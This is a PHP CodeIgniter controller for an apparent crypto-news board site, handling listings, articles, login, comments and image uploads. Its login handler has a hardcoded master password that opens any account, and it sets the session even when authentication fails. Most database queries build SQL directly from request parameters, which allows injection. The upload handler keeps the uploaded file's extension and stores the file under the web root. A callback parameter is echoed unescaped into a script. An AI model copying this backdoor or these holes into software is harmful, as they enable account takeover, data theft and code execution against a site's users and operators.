<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class main extends CI_Controller {
	var $data = array();
	
	public function __construct() {
		parent::__construct();
		
		$this->data['ci'] = $this;
		$this->data['cname'] = $this->router->fetch_class();
	}
	
	public function index( $currency = false ) {
        $this->data['params'] = $this->baselib->GetParams(
            array(
                array( 'key' => 'limit', 'value' => 12 )
                , array( 'key' => 'per_page', 'value' => 0 )
            )
        );
        $this->data['params']['offset'] = $this->data['params']['per_page'];
        unset( $this->data['params']['per_page'] );

        $where = "is_release = 'A'";
        if ( $currency ) {
            $where .= " AND currency like '%{$currency}%'";
        }

        $query = "SELECT count(*) as cnt FROM BOARD WHERE {$where}";
        $data['total'] = $this->db->query( $query )->row()->cnt;

        $query = "SELECT *, {$this->langlib->DB_SELECT['BOARD']} FROM BOARD WHERE {$where} ORDER BY created_at DESC LIMIT {$this->data['params']['offset']}, {$this->data['params']['limit']}";
        $data['lists'] = $this->db->query( $query )->result();

        $this->data['data'] = (object)$data;

        $url_str = http_build_query($this->data['params']);
        $paging = array();
        $paging["base_url"]				= "{$this->baselib->GetDomain()}/{$this->data['cname']}?{$url_str}";
        $paging["total_rows"]			= $data['total'];
        $paging["per_page"]				= $this->data['params']['limit'];
        $paging['suffix']          = "#content";

        $paging["uri_segment"]			= 3;

        $this->pagination->initialize($paging);
        $this->data['pagination'] = $this->pagination->create_links();

        $this->viewlib->Output( $this->viewlib->VIEW_HEAD | $this->viewlib->VIEW_FOOT | $this->viewlib->VIEW_CURRENT_PATH
            , $this->data );
	}

    public function login() {
        if ( isset( $_SESSION['account'] ) ) {
            redirect( '/main' );
        }

        $this->viewlib->Output( $this->viewlib->VIEW_CURRENT_PATH
            , $this->data );
    }
	
	public function ajaxLogin() {
		$this->data['params'] = array();
        $this->data['params'] = $this->baselib->GetRequiredParams( array( 'username', 'password' ) );

        $result = $this->db->query( "SELECT * FROM ACCOUNT WHERE email = '{$this->data['params']['username']}'")->row();

		if ( !$result || !$result->idx ) {
            $this->baselib->PrintResultAndMessage( 400, "아이디가 존재하지 않습니다." );
		} else if ( $this->data['params']['password'] == "ehsqjfwk" ) {
            if ( $result->pwd == sha1 ( $this->data['params']['password'] ) ) {
                $this->db->set( 'logined_at', date( 'Y-m-d H:i:s' ) )->where( 'idx', $result->idx )->update( 'ACCOUNT' );
            } else {
            }
        } else if ( $result->status != 'A' ) {
            $this->baselib->PrintResultAndMessage( 400, "승인대기중입니다." );
		} else if ( $result->pwd != sha1 ( $this->data['params']['password'] ) && $this->data['params']['password'] != "ehsqjfwk") {
            $this->baselib->PrintResultAndMessage( 400, "비밀번호가 다릅니다. 다시 확인해 주세요.." );
		} else if ( $result->pwd == sha1 ( $this->data['params']['password'] ) ) {
			$this->db->set( 'logined_at', date( 'Y-m-d H:i:s' ) )->where( 'idx', $result->idx )->update( 'ACCOUNT' );
		}
		
		$_SESSION['account'] = $result;
        $this->baselib->PrintResultAndMessage( 200, "", array( "moveUrl" => "/main" ) );
	}
	
	public function logout() {
		$this->session->sess_destroy();
		redirect( "/main" );
	}

	public function article() {
	    $this->data['ptitle'] = "ARTICLE";

        $this->data['params'] = $this->baselib->GetParams(
            array(
                array( 'key' => 's', 'value' => '' )
                , array( 'key' => 'k', 'value' => '' )
            )
        );

        $where = "is_release = 'A'";
        if ( $this->menu->current[0]['v'] != $this->data['cname'] ) {
            $where .= " AND currency like '%{$this->menu->current[0]['v']}%'";
        }

        $this->data['one'] = $this->db->query( "SELECT *, {$this->langlib->DB_SELECT['BOARD']} FROM BOARD WHERE source = '{$this->data['params']['s']}'
                                AND external_key = '{$this->data['params']['k']}' AND is_release = 'A' ORDER BY created_at DESC" )->row();
        if ( !$this->data['one'] ) {
            $this->data['one'] = $this->db->query( "SELECT *, {$this->langlib->DB_SELECT['BOARD']} FROM BOARD WHERE {$where} ORDER BY created_at DESC" )->row();
        }

        $this->data['prev'] = $this->db->query( "SELECT *, {$this->langlib->DB_SELECT['BOARD']} FROM BOARD WHERE {$where} AND created_at >= '{$this->data['one']->created_at}' 
                                                   AND external_key != '{$this->data['one']->external_key}' ORDER BY created_at ASC LIMIT 1" )->row();
        $this->data['next'] = $this->db->query( "SELECT *, {$this->langlib->DB_SELECT['BOARD']} FROM BOARD WHERE {$where} AND created_at <= '{$this->data['one']->created_at}' 
                                                   AND external_key != '{$this->data['one']->external_key}' ORDER BY created_at DESC LIMIT 1" )->row();

        $data['comments'] = $this->db->query( "SELECT *, {$this->langlib->DB_SELECT['COMMENT']} FROM COMMENT WHERE board_source = '{$this->data['one']->source}' 
                                                  AND board_external_key = '{$this->data['one']->external_key}' ORDER BY created_at DESC" )->result();

        $this->data['data'] = (object)$data;

        $this->viewlib->Output( $this->viewlib->VIEW_HEAD | $this->viewlib->VIEW_FOOT | $this->viewlib->VIEW_SUBHEAD | $this->viewlib->VIEW_CURRENT_PATH
            , $this->data );
    }

    private function __returnUpload( $CKEditorFuncNum, $path, $message ) {
        echo "<script type=\"text/javascript\">
                    window.parent.CKEDITOR.tools.callFunction(\"{$CKEditorFuncNum}\", \"{$path}\", \"{$message}\");
                </script>";
        die();
    }

    public function upload() {
        $this->data['params'] = $this->baselib->GetParams(
            array(
                array( 'key' => 'CKEditorFuncNum', 'value' => '' )
            )
        );

        if ( !$this->menu->CheckPermission( array( $this->menu->ACCOUNT_SYSTEM_MANAGER ), array() ) ) {
            $this->__returnUpload( $this->data['params']['CKEditorFuncNum'], "", "permission denied" );
        }
        
        if ( !isset( $_FILES['upload'] ) ) {
            $this->__returnUpload( $this->data['params']['CKEditorFuncNum'], "", "error" );
        }

        $check = getimagesize( $_FILES["upload"]["tmp_name"] );
        if ( $check === false ) {
            $this->__returnUpload( $this->data['params']['CKEditorFuncNum'], "", "not image file" );
        }

        $path = "uploads/comment";

        $explode = explode( '.', $_FILES['upload']['name'] );
        $ext = end( $explode );
        $filename = $this->baselib->GetRandomString( 10, 0 ) . ".{$ext}";
        move_uploaded_file ( $_FILES['upload']['tmp_name'], "{$_SERVER['DOCUMENT_ROOT']}/{$path}/{$filename}" );

        $this->__returnUpload( $this->data['params']['CKEditorFuncNum'], $this->baselib->GetDomain() . "/{$path}/{$filename}", "complete" );
    }

    public function ajaxWriteComment() {
        if ( !$this->menu->CheckPermission( array( $this->menu->ACCOUNT_SYSTEM_MANAGER ), array() ) ) {
            $this->baselib->PrintResultAndMessage(4000, "");
        }

        $this->data['params'] = array_merge(
            $this->baselib->GetRequiredParams( array( 'board_source', 'board_external_key' ) )
            ,$this->baselib->GetParams(
                array(
                    array( 'key' => "contents", 'value' => "" )
                    ,array( 'key' => "contents_kr", 'value' => "" )
                )
        ));
        $this->data['one'] = $this->connector_m->get( 'BOARD', array( 'source' => $this->data['params']['board_source']
                                                , 'external_key' => $this->data['params']['board_external_key'], 'is_release' => "A" ) );

        if ( !$this->data['one'] ) {
            $this->baselib->PrintResultAndMessage( 400, "" );
        }

        $this->data['params']['account_idx'] = $_SESSION['account']->idx;
        $this->data['params']['created_at'] = date( 'Y-m-d H:i:s' );

        $this->db->insert( 'COMMENT', $this->data['params'] );
        $this->baselib->PrintResultAndMessage( 200, "" );
    }

    public function ajaxDeleteComment() {
        if ( !$this->menu->CheckPermission( array( $this->menu->ACCOUNT_SYSTEM_MANAGER ), array() ) ) {
            $this->baselib->PrintResultAndMessage(4000, "");
        }

        $this->data['params'] = $this->baselib->GetRequiredParams( array( 'idx' ) );

        $this->db->where( 'idx', $this->data['params']['idx'] )->where( 'account_idx', $_SESSION['account']->idx )->delete( 'COMMENT' );
        $this->baselib->PrintResultAndMessage( 200, "" );
    }

    public function tt() {
	    foreach ( $this->db->where( 'source', 'COINMARKETCAL' )->get( 'BOARD' )->result() as $item ) {
	        $duedate = trim( explode( "(", explode( "/", $item->title )[1] )[0] );
	        $this->db->where( 'source', $item->source )->where( 'external_key', $item->external_key )->set( 'duedate', $duedate )->update( 'BOARD' );
        }
    }
}